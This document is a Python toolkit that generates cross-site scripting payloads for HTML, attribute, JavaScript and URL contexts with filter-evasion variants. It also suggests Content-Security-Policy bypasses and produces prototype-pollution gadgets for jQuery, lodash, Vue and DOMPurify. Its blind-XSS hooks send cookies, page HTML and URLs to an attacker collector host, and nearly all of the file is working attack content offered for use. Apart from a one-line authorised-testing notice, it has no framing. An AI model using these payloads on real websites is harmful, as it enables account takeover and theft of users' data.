#!/usr/bin/env python3
"""
xss_csp_forge.py - XSS context payloads, CSP-bypass finder, client-side
prototype-pollution gadget generator (2024-2026).

Modes:
  contexts    print context-specific XSS payloads (html/attr/js/url/svg) with
              modern WAF-evasion forms
  csp         analyse a Content-Security-Policy string and suggest bypasses
              (nonce reuse, unsafe-inline, JSONP/Angular/known-CDN gadgets,
              base-uri/object-src gaps, script-src 'self' upload-trick)
  proto       client-side prototype-pollution -> XSS gadget payloads
              (jQuery, lodash, Vue, sanitizer-config gadgets)
  blind       generate blind-XSS hooks pointing at a collector

Stdlib only.

Usage:
  python3 xss_csp_forge.py contexts --collector https://atk.tld
  python3 xss_csp_forge.py csp "default-src 'self'; script-src 'self' 'unsafe-inline'"
  python3 xss_csp_forge.py proto
  python3 xss_csp_forge.py blind --collector https://atk.tld/c

LEGAL: authorized testing only.
"""
import argparse


def contexts(collector):
    exfil = f"//{collector}/?c=" if collector else "//ATTACKER/?c="
    body = exfil
    return {
        "HTML body": [
            "<img src=x onerror=alert(document.domain)>",
            "<svg onload=alert(document.domain)>",
            "<details open ontoggle=alert(1)>",
            "<iframe srcdoc=\"<script>alert(1)</script>\">",
            f"<script>fetch('{body}'+document.cookie)</script>",
            "<xss autofocus tabindex=1 onfocus=alert(1)></xss>",  # custom element
        ],
        "Attribute": [
            '" onfocus=alert(1) autofocus x="',
            '"><svg onload=alert(1)>',
            "' accesskey='x' onclick='alert(1)",
            "\" onmouseover=alert(1) style=display:block;width:100%;height:100% x=\"",
        ],
        "JavaScript string": [
            "';alert(1)//",
            "'-alert(1)-'",
            "</script><svg onload=alert(1)>",
            "${alert(document.domain)}",                # template literal context
            "*/alert(1)//",
        ],
        "URL / href": [
            "javascript:alert(document.domain)",
            "javascript:alert(1)%0d%0a",
            "data:text/html,<script>alert(1)</script>",
            "java\tscript:alert(1)",
        ],
        "WAF / filter evasion": [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<svg><script>alert&lpar;1&rpar;</script></svg>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",   # base64 eval
            "<svg onload=alert`1`>",                            # backtick call
            "<a href=&#x6a;avascript:alert(1)>x</a>",           # entity-encoded scheme
            "<input/onfocus=alert(1)//autofocus>",              # slash-as-separator
            "<x onclick=window['ale'+'rt'](1)>x</x>",           # string-concat fn name
        ],
        "DOM sinks to chase": [
            "location.hash -> innerHTML / document.write / eval / setTimeout",
            "postMessage handler -> innerHTML without origin check",
            "URLSearchParams -> .src / .href / jQuery $(userinput)",
        ],
    }


def csp_bypass(policy):
    p = policy.lower()
    findings = []
    directives = {}
    for part in p.split(";"):
        part = part.strip()
        if not part:
            continue
        toks = part.split()
        directives[toks[0]] = toks[1:]

    script_src = directives.get("script-src", directives.get("default-src", []))
    if "'unsafe-inline'" in script_src and not any(s.startswith("'nonce-") or s.startswith("'sha") for s in script_src):
        findings.append("script-src allows 'unsafe-inline' with no nonce/hash -> inject inline <script> freely")
    if "'unsafe-eval'" in script_src:
        findings.append("'unsafe-eval' present -> Angular/template sandbox-escape & eval gadgets usable")
    if any(s.startswith("'nonce-") for s in script_src):
        findings.append("nonce present -> hunt for nonce reuse / dangling-markup nonce leak / cached nonce")
    for cdn in ("*.google.com", "ajax.googleapis.com", "*.cloudflare.com", "unpkg.com",
                "cdnjs.cloudflare.com", "*.googleapis.com"):
        if cdn in script_src or any(cdn.strip("*.") in s for s in script_src):
            findings.append(f"allow-listed CDN {cdn} -> use JSONP/AngularJS gadget (e.g. angular.min.js + ng-app)")
    if "object-src" not in directives and "default-src" not in directives:
        findings.append("no object-src -> <object data=...>/<embed> may execute (Flash/SVG legacy)")
    if "'none'" not in directives.get("object-src", []) and "object-src" not in directives:
        findings.append("object-src not 'none' -> data:/SVG plugin vectors")
    if "base-uri" not in directives:
        findings.append("no base-uri -> inject <base href> to hijack relative script loads (script gadget)")
    if "*" in script_src or "https:" in script_src or "data:" in script_src:
        findings.append("wildcard/scheme source in script-src -> host script anywhere / data: URI script")
    if "'self'" in script_src:
        findings.append("script-src 'self' -> if you can upload .js or get reflected JS on same-origin, load it")
    if not findings:
        findings.append("no obvious bypass; check for script gadgets in trusted scripts and report-only mode")
    return findings


def proto_xss():
    return {
        "Generic detection": [
            "Object.prototype.test=123  -> check {}.test in console",
            "?__proto__[test]=123  /  ?constructor[prototype][test]=123",
            'JSON merge: {"__proto__":{"polluted":true}}',
        ],
        "jQuery html() gadget": [
            'Object.prototype.innerHTML = "<img src=x onerror=alert(1)>"',
            '?__proto__[innerHTML]=<img/src/onerror=alert(1)>',
        ],
        "lodash _.template gadget": [
            "Object.prototype.sourceURL = '\\u000aalert(1)//'",
            "Object.prototype.escape = '<%- alert(1) %>'",
        ],
        "Vue.js gadget": [
            "Object.prototype.template = '<div v-html=\"constructor.constructor(`alert(1)`)()\"></div>'",
        ],
        "Sanitizer-config gadget (DOMPurify allow-list pollution)": [
            'Object.prototype.ALLOWED_ATTR = ["onerror","src"]  // weaken sanitizer',
            'Object.prototype.ALLOW_UNKNOWN_PROTOCOLS = true',
        ],
        "Script-gadget loaders": [
            "?__proto__[src]=//attacker/x.js   (gadgets that set element.src from object)",
            "?__proto__[hitCallback]=alert(document.domain)  (Google Analytics gadget)",
        ],
    }


def blind(collector):
    c = collector or "https://ATTACKER/c"
    return [
        f"<script src={c}></script>",
        f"<img src=x onerror=\"import('{c}.js')\">",
        f"\"><script>document.location='{c}?'+encodeURIComponent(document.cookie+'|'+document.domain+'|'+location.href)</script>",
        f"<svg onload=\"fetch('{c}',{{method:'POST',body:document.documentElement.outerHTML}})\">",
        f"<x onfocus=eval(atob('{ '...base64 hook...' }')) autofocus>",
    ]


def main():
    ap = argparse.ArgumentParser(description="XSS/CSP/client-PP toolkit (2024-2026)")
    sub = ap.add_subparsers(dest="cmd", required=True)
    p = sub.add_parser("contexts"); p.add_argument("--collector", default=""); p.set_defaults(fn="contexts")
    p = sub.add_parser("csp"); p.add_argument("policy"); p.set_defaults(fn="csp")
    p = sub.add_parser("proto"); p.set_defaults(fn="proto")
    p = sub.add_parser("blind"); p.add_argument("--collector", default=""); p.set_defaults(fn="blind")
    args = ap.parse_args()

    if args.fn == "contexts":
        for ctx, payloads in contexts(args.collector).items():
            print(f"\n=== {ctx} ===")
            for pl in payloads:
                print("  " + pl)
    elif args.fn == "csp":
        print(f"[*] analysing CSP: {args.policy}\n")
        for f in csp_bypass(args.policy):
            print("  [bypass] " + f)
    elif args.fn == "proto":
        for label, payloads in proto_xss().items():
            print(f"\n=== {label} ===")
            for pl in payloads:
                print("  " + pl)
    elif args.fn == "blind":
        print("[*] blind XSS hooks:")
        for pl in blind(args.collector):
            print("  " + pl)


if __name__ == "__main__":
    main()
